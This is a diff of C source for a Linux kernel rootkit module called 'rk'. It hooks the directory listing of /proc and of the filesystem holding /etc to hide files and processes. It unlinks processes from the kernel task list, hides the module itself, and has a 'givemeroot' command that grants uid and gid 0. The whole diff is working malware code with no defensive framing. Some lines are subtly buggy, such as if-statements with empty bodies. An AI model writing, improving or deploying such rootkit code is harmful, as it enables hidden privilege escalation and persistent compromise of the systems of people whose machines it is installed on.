@@ -21,7 +21,7 @@ static int (*fs_iterate_orig)(struct file *, struct dir_context *);
 static int size, temp;
 static int current_pid = 0;
 
-static int pids_to_hide[MAX_PIDS];
+static char pids_to_hide[MAX_PIDS][8];
 static char module_status[1024];
 static char hide_files = 0;
 static char hide_procs = 0;
@@ -33,6 +33,7 @@ static struct list_head *module_kobj_previous;
 static struct proc_dir_entry *proc_rk;
 static struct file_operations *procfs_fops;
 static struct file_operations *fs_fops;
+static struct task_struct* procs_to_hide[MAX_PIDS];
 
 #define MIN(a,b) \
 ( \
@@ -61,43 +62,25 @@ static void set_addr_ro(void *addr)
     pte->pte = pte->pte &~_PAGE_RW;
 }
 
-static int rk_atoi(const char *str)
+static int procfs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
-    int ret = 0, mul = 1;
-    const char *ptr;
+    int i;
 
-    for(ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
-
-    ptr--;
-    while(ptr >= str)
+    for(i = 0; i < current_pid; i++)
     {
-        if(*ptr < '0' || *ptr > '9')
-            break;
-
-        ret += (*ptr - '0') * mul;
-        mul *= 10;
-        ptr--;
-    }
-
-    return ret;
-}
-
-static int procfs_filldir_new(void *buf, const char *name, int namelen,
-    loff_t off, ino_t ino, unsigned d_type)
-{
-    if(hide_procs)
-    {
-        if(rk_atoi(name) == pids_to_hide[current_pid])
+        if(!strcmp(name, pids_to_hide[i]))
             return 0;
     }
+    if(!strcmp(name, "rk"))
+        return 0;
 
-    return procfs_filldir_orig(buf, name, namelen, off, ino, d_type);
+    return procfs_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
 
 static int procfs_iterate_new(struct file *filp, struct dir_context *ctx)
 {
     procfs_filldir_orig = ctx->actor;
-    *((filldir_t*)&ctx->actor) = *((filldir_t*)&procfs_filldir_new);
+    *((filldir_t*)&ctx->actor) = &procfs_filldir_new;
 
     return procfs_iterate_orig(filp, ctx);
 }
@@ -119,30 +102,7 @@ static int fs_iterate_new(struct file *filp, struct dir_context *ctx)
     return fs_iterate_orig(filp, ctx);
 }
 
-static void procs_hide(void)
-{
-    if(hide_procs)
-        return;
-
-    set_addr_rw(procfs_fops);
-    procfs_fops->iterate = procfs_iterate_new;
-    set_addr_ro(procfs_fops);
-    hide_procs = !hide_procs;
-
-}
-
-static void procs_show(void)
-{
-    if(!hide_procs)
-        return;
-
-    set_addr_rw(procfs_fops);
-    procfs_fops->iterate = procfs_iterate_orig;
-    set_addr_ro(procfs_fops);
-    hide_procs = !hide_procs;
-}
-
-static void module_hide(void)
+void module_hide(void)
 {
     if(hide_module)
         return;
@@ -157,14 +117,12 @@ static void module_hide(void)
 
 static void module_show(void)
 {
-    int result;
-
     if(!hide_module)
         return;
 
     list_add(&THIS_MODULE->list, module_previous);
-    result = kobject_add(&THIS_MODULE->mkobj.kobj,
-        THIS_MODULE->mkobj.kobj.parent, "rk");
+    if(kobject_add(&THIS_MODULE->mkobj.kobj,
+        THIS_MODULE->mkobj.kobj.parent, "rk"));
     hide_module = !hide_module;
 }
 
@@ -184,13 +142,12 @@ static ssize_t rk_read(struct file *file, char __user *buffer,
             "CMDS: \n\
         -> givemeroot  - uid and gid 0 for writing process \n\
         ->------------------------------------------------- \n\
-        -> nhprocXXXXX - proc id to be norm hidden \n\
+        -> nhprocXXXXX - proc id to be hidden \n\
         -> uhprocXXXXX - proc id to be unhidden \n\
         ->------------------------------------------------- \n\
         -> thproc      - toggle hidden procs \n\
         -> thfile      - toggle hidden files \n\
-        -> nhmodu      - a normal hidden module \n\
-        -> uhmodu      - a normal unhidden module \n\
+        -> thmodu      - toggle hidden module \n\
         ->------------------------------------------------- \n\
         -> Procs hidden?:: %d \n\
         -> Files hidden?:: %d \n\
@@ -213,15 +170,33 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
     {
         if(current_pid < MAX_PIDS)
         {
-            pids_to_hide[current_pid] = rk_atoi(buffer + 6);
-            procs_hide();
-            current_pid++;
+            long pid;
+            char pid_s[MIN(7, count - 6) + 1];
+
+            struct task_struct *p;
+
+            pid_s[MIN(7, count - 6)] = 0;
+            strncpy(pids_to_hide[current_pid++], buffer + 6, MIN(7, count - 6));
+            strncpy(pid_s, buffer + 6, MIN(7, count - 6));
+
+            for_each_process(p)
+            {
+                if(kstrtol(pid_s, 10, &pid));
+                if(pid == p->pid)
+                {
+                    procs_to_hide[current_pid] = p;
+                    //list_del(&p->tasks);
+                    p->tasks.prev->next = p->tasks.next;
+                    p->tasks.next->prev = p->tasks.prev;
+                }
+            }
         }
     }
     else if(!strncmp(buffer, "uhproc", MIN(6, count)))
     {
-        pids_to_hide[current_pid] = 0;
-        procs_show();
+        if(current_pid > 0 && procs_to_hide[current_pid] != NULL)
+            list_add(&procs_to_hide[current_pid]->tasks,
+                procs_to_hide[current_pid]->tasks.prev);
 
         if(current_pid > 0)
             current_pid--;
@@ -270,8 +245,7 @@ static int __init procfs_init(void)
     ->------------------------------------------------- \n\
     -> thproc      - toggle hidden procs \n\
     -> thfile      - toggle hidden files \n\
-    -> nhmodu      - a normal hidden module \n\
-    -> uhmodu      - a normal unhidden module \n\
+    -> thmodu      - toggle hidden module \n\
     ->------------------------------------------------- \n\
     -> Procs hidden?:: %d \n\
     -> Files hidden?:: %d \n\
@@ -279,7 +253,6 @@ static int __init procfs_init(void)
     size = strlen(module_status);
     temp = size;
 
-    /*open /proc */
     proc_filp = filp_open("/proc", O_RDONLY, 0);
     if(proc_filp == NULL)
         return 0;
@@ -287,11 +260,10 @@ static int __init procfs_init(void)
     procfs_fops = (struct file_operations*)proc_filp->f_op;
     filp_close(proc_filp, NULL);
 
-    //substitute iterate of fs on which /etc is
-    //fs_iterate_orig = procfs_fops->iterate;
-    //set_addr_rw(procfs_fops);
-    //procfs_fops->iterate = procfs_iterate_new;
-    //set_addr_ro(procfs_fops);
+    procfs_iterate_orig = procfs_fops->iterate;
+    set_addr_rw(procfs_fops);
+    procfs_fops->iterate = procfs_iterate_new;
+    set_addr_ro(procfs_fops);
 
     return 1;
 }
@@ -300,7 +272,6 @@ static int __init fs_init(void)
 {
     struct file *etc_filp;
 
-    //get file_operations of /etc
     etc_filp = filp_open("/etc", O_RDONLY, 0);
     if(etc_filp == NULL)
         return 0;
@@ -308,7 +279,6 @@ static int __init fs_init(void)
     fs_fops = (struct file_operations*)etc_filp->f_op;
     filp_close(etc_filp, NULL);
 
-    //substitute iterate of fs on which /etc is
     fs_iterate_orig = fs_fops->iterate;
     set_addr_rw(fs_fops);
     fs_fops->iterate = fs_iterate_new;
